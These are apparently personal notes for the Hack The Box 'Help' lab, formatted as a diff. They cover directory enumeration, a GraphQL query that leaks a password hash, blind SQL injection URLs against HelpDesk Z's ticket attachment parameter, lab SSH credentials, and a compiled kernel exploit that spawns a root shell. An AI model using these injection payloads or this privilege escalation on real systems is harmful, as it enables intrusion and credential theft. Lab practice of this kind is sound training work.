@@ -1,0 +1,251 @@
+
+
+
+
+
+
+┌──(kali㉿kali)-[~]
+└─$ feroxbuster -u http://help.htb -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x php,txt,html --filter-status 404
+                                                                                                                    
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://help.htb
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
+ 💢  Status Code Filters   │ [404]
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 💲  Extensions            │ [php, txt, html]
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+403      GET       11l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+404      GET        9l       32w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       15l       74w     6143c http://help.htb/icons/ubuntu-logo.png
+200      GET      375l      968w    11321c http://help.htb/
+200      GET      375l      968w    11321c http://help.htb/index.html
+301      GET        9l       28w      309c http://help.htb/javascript => http://help.htb/javascript/
+301      GET        9l       28w      306c http://help.htb/support => http://help.htb/support/
+200      GET       17l       42w      378c http://help.htb/support/.gitattributes
+200      GET      339l     2968w    18092c http://help.htb/support/LICENSE.txt
+301      GET        9l       28w      316c http://help.htb/javascript/jquery => http://help.htb/javascript/jquery/
+200      GET       15l       67w     4372c http://help.htb/support/captcha.php
+301      GET        9l       28w      318c http://help.htb/support/controllers => http://help.htb/support/controllers/                                                                                                                  
+301      GET        9l       28w      310c http://help.htb/support/css => http://help.htb/support/css/
+200      GET        4l       13w     2302c http://help.htb/support/favicon.ico
+200      GET       97l      236w     4413c http://help.htb/support/index.php
+301      GET        9l       28w      324c http://help.htb/support/controllers/admin => http://help.htb/support/controllers/admin/
+500      GET        0l        0w        0c http://help.htb/support/controllers/admin/staff_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/admin/departments_action.php
+301      GET        9l       28w      309c http://help.htb/support/js => http://help.htb/support/js/
+301      GET        9l       28w      313c http://help.htb/support/images => http://help.htb/support/images/
+301      GET        9l       28w      315c http://help.htb/support/includes => http://help.htb/support/includes/
+500      GET        0l        0w        0c http://help.htb/support/controllers/admin/general_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/admin/tickets_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/admin/email_template_action.php
+301      GET        9l       28w      325c http://help.htb/support/controllers/client => http://help.htb/support/controllers/client/
+500      GET        0l        0w        0c http://help.htb/support/controllers/client/profile_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/client/password_action.php
+200      GET    10351l    43235w   284394c http://help.htb/javascript/jquery/jquery
+200      GET      153l      619w     7509c http://help.htb/support/readme.html
+500      GET        0l        0w        0c http://help.htb/support/controllers/client/logout_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/client/preferences_action.php
+302      GET        0l        0w        0c http://help.htb/support/controllers/index.php => http://help.htb/
+200      GET        0l        0w        0c http://help.htb/support/css/index.php
+301      GET        9l       28w      314c http://help.htb/support/uploads => http://help.htb/support/uploads/
+301      GET        9l       28w      312c http://help.htb/support/views => http://help.htb/support/views/
+301      GET        9l       28w      324c http://help.htb/support/controllers/staff => http://help.htb/support/controllers/staff/
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/logout_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/news_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/users_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/tickets_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/login_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/preferences_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/dashboard_action.php
+500      GET        0l        0w        0c http://help.htb/support/controllers/staff/knowledgebase_action.php
+200      GET        0l        0w        0c http://help.htb/support/controllers/staff/settings_action.php
+302      GET        0l        0w        0c http://help.htb/support/js/index.php => http://help.htb/
+200      GET        0l        0w        0c http://help.htb/support/includes/config.php
+200      GET        0l        0w        0c http://help.htb/support/includes/functions.php
+301      GET        9l       28w      323c http://help.htb/support/includes/classes => http://help.htb/support/includes/classes/
+200      GET        0l        0w        0c http://help.htb/support/includes/global.php
+301      GET        9l       28w      319c http://help.htb/support/views/client => http://help.htb/support/views/client/
+302      GET        0l        0w        0c http://help.htb/support/includes/index.php => http://help.htb/
+301      GET        9l       28w      316c http://help.htb/support/images/cp => http://help.htb/support/images/cp/
+301      GET        9l       28w      324c http://help.htb/support/includes/language => http://help.htb/support/includes/language/
+301      GET        9l       28w      317c http://help.htb/support/js/tinymce => http://help.htb/support/js/tinymce/
+200      GET        0l        0w        0c http://help.htb/support/images/index.php
+200      GET        0l        0w        0c http://help.htb/support/includes/language/spanish.php
+200      GET        0l        0w        0c http://help.htb/support/includes/language/english.php
+302      GET        0l        0w        0c http://help.htb/support/views/index.php => http://help.htb/
+200      GET        1l        2w       18c http://help.htb/support/includes/pipe.php
+200      GET       47l      111w     1084c http://help.htb/support/views/client/404.html
+301      GET        9l       28w      323c http://help.htb/support/uploads/articles => http://help.htb/support/uploads/articles/
+302      GET        0l        0w        0c http://help.htb/support/uploads/index.php => http://help.htb/
+200      GET      111l      435w     5944c http://help.htb/support/views/client/site.html
+200      GET        6l       28w      210c http://help.htb/support/views/client/home.html
+302      GET        0l        0w        0c http://help.htb/support/views/client/index.php => http://help.htb/
+200      GET       20l       55w      695c http://help.htb/support/views/client/maintenance.html
+301      GET        9l       28w      318c http://help.htb/support/views/staff => http://help.htb/support/views/staff/
+200      GET       39l      131w     1342c http://help.htb/support/views/client/news.html
+302      GET        0l        0w        0c http://help.htb/support/js/tinymce/index.php => http://help.htb/
+302      GET        0l        0w        0c http://help.htb/support/includes/classes/index.php => http://help.htb/
+301      GET        9l       28w      322c http://help.htb/support/uploads/tickets => http://help.htb/support/uploads/tickets/
+200      GET      504l     4372w    26427c http://help.htb/support/js/tinymce/license.txt
+302      GET        0l        0w        0c http://help.htb/support/images/cp/index.php => http://help.htb/
+200      GET       42l      148w     1916c http://help.htb/support/views/client/tickets.html
+301      GET        9l       28w      325c http://help.htb/support/js/tinymce/plugins => http://help.htb/support/js/tinymce/plugins/
+301      GET        9l       28w      323c http://help.htb/support/js/tinymce/langs => http://help.htb/support/js/tinymce/langs/
+301      GET        9l       28w      323c http://help.htb/support/js/tinymce/skins => http://help.htb/support/js/tinymce/skins/
+302      GET        0l        0w        0c http://help.htb/support/uploads/articles/index.php => http://help.htb/
+200      GET       47l      111w     1084c http://help.htb/support/views/staff/404.html
+301      GET        9l       28w      324c http://help.htb/support/js/tinymce/themes => http://help.htb/support/js/tinymce/themes/
+200      GET      109l      762w     8347c http://help.htb/support/views/staff/site.html
+200      GET      109l      332w     5099c http://help.htb/support/views/staff/dashboard.html
+302      GET        0l        0w        0c http://help.htb/support/views/staff/index.php => http://help.htb/
+200      GET       30l      101w     1178c http://help.htb/support/views/staff/login.html
+200      GET       42l      147w     1688c http://help.htb/support/views/staff/news.html
+200      GET       70l      237w     2994c http://help.htb/support/views/staff/news_insert.html
+200      GET      120l      362w     4895c http://help.htb/support/views/staff/preferences.html
+302      GET        0l        0w        0c http://help.htb/support/uploads/tickets/index.php => http://help.htb/
+200      GET      120l      342w     4829c http://help.htb/support/views/staff/filter_bar.html
+200      GET      111l      412w     6032c http://help.htb/support/views/staff/tickets.html
+[####################] - 3m    342748/342748  0s      found:89      errors:618    
+[####################] - 16s    18988/18988   1151/s  http://help.htb/ 
+[####################] - 37s    18988/18988   507/s   http://help.htb/javascript/ 
+[####################] - 43s    18988/18988   438/s   http://help.htb/support/ 
+[####################] - 47s    18988/18988   401/s   http://help.htb/javascript/jquery/ 
+[####################] - 51s    18988/18988   370/s   http://help.htb/support/controllers/ 
+[####################] - 52s    18988/18988   365/s   http://help.htb/support/css/ 
+[####################] - 71s    18988/18988   269/s   http://help.htb/support/images/ 
+[####################] - 64s    18988/18988   296/s   http://help.htb/support/includes/ 
+[####################] - 2s     18988/18988   7719/s  http://help.htb/support/controllers/admin/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 50s    18988/18988   379/s   http://help.htb/support/js/ 
+[####################] - 4s     18988/18988   4376/s  http://help.htb/support/controllers/client/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 72s    18988/18988   265/s   http://help.htb/support/uploads/ 
+[####################] - 57s    18988/18988   334/s   http://help.htb/support/views/ 
+[####################] - 0s     18988/18988   111041/s http://help.htb/support/controllers/staff/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 70s    18988/18988   270/s   http://help.htb/support/includes/classes/ 
+[####################] - 65s    18988/18988   291/s   http://help.htb/support/images/cp/ 
+[####################] - 54s    18988/18988   351/s   http://help.htb/support/views/client/ 
+[####################] - 5s     18988/18988   3994/s  http://help.htb/support/includes/language/ => Directory listing (add --scan-dir-listings to scan)
+[####################] - 57s    18988/18988   332/s   http://help.htb/support/js/tinymce/ 
+[####################] - 62s    18988/18988   306/s   http://help.htb/support/uploads/articles/                                                                                                                      
+┌──(kali㉿kali)-[~]
+└─$ 
+
+
+
+
+
+
+
+
+
+HelpDesk Z Version: 1.0.2
+
+
+
+back to port 3000
+
+
+┌──(kali㉿kali)-[~]
+└─$ curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username} }' | jq
+{
+  "data": {
+    "user": {
+      "username": "helpme@helpme.com"
+    }
+  }
+}
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ curl -s -G http://help.htb:3000/graphql --data-urlencode 'query={user {username, password} }' | jq
+{
+  "data": {
+    "user": {
+      "username": "helpme@helpme.com",
+      "password": "5d3c93182bb20f07b994a7f617e99cff"
+    }
+  }
+}
+                                                                                                                    
+this MD5 pass hash cracks to godhelpmeplz
+this is used to login to the HelpDesk
+
+"From initial enumeration, we know the version is vulnerable to SQL injection.
+Let's upload a ticket and fetch the attachment URL. Navigate to Submit and ticket and upload a ticket with
+an image as an attachment. Go to View Tickets and open the ticket."
+
+"Right-click on the attachment and copy the link. Request it and intercept in burp. An example ticket is,"
+
+Right-click on the attachment and copy the link. Request it and intercept in burp. An example ticket is,
+Let's check if it’s vulnerable to SQLI,
+Sending this results in a true condition which returns the image but changing it to 1=2 doesn’t because it
+evaluates to false. This confirms the SQLi vulnerability.
+From the login controller we know the table name i.e staff and the columns username and password. The
+password is stored as a SHA1 hash which a 40 characters long.
+Lets check if the username is admin.
+This query returns the attachment which means it was true. In case the user wasn’t admin, for example,
+http://help.htb/support/?
+v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6
+http://help.htb/support/?
+v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and 1=1--
+-
+http://help.htb/support/?
+v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and
+(select (username) from staff limit 0,1) = 'admin'-- -
+http://help.htb/support/?
+v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and
+(select (username) from staff limit 0,1) = 'dummy'-- -
+It results in false and the page returns not found. Now we have a username and need to determine the
+password. For this, the password has to be determined character by character up to 40 times. For this, we
+can use the substr() function which will loop character by character.
+It returns the attachment and confirms that the hash starts with d.
+This can be scripted.
+Copy your cookies from burp into the script, then run it. The script checks the hash character by character, if
+a character is found, the count is incremented and moved to the next one.
+http://help.htb/support/?
+v=view_tickets&action=ticket&param[]=4&param[]=attachment&param[]=1&param[]=6 and
+substr((select password from staff limit 0,1),1,1) = 'd'-- -
+
+
+
+
+much sql later...
+
+
+ssh help@10.10.10.121 : Welcome1
+
+help@help:~/help$ uname -a
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+
+
+https://www.exploit-db.com/exploits/44298
+
+
+help@help:~/help$ 
+help@help:~/help$ which gcc
+/usr/bin/gcc
+help@help:~/help$ nano exploit.c
+help@help:~/help$ gcc exploit.c -o exploit
+help@help:~/help$ ls
+dist  exploit  exploit.c  LICENSE  node_modules  package.json  README.md  src  test  webpack.config.js
+help@help:~/help$ chmod +x exploit
+help@help:~/help$ ./exploit
+task_struct = ffff88001cd02a00
+uidptr = ffff88001cfc5304
+spawning root shell
+root@help:~/help# cat /root/root.txt
+
+
+
+
+
